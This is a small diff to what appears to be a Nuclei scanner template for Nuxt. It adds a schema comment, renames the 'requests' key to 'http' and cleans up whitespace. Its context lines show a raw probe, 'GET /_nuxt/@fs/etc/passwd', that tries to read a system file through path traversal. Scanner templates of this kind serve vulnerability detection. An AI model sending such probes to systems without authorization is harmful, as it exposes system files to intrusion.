@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nuxt_fs
 
 info:
@@ -8,10 +9,10 @@ info:
   reference:
     - https://
     - http://
-    
+
   tags: tags
 
-requests:
+http:
   - raw:
       - |+
         GET /_nuxt/@fs/etc/passwd HTTP/2
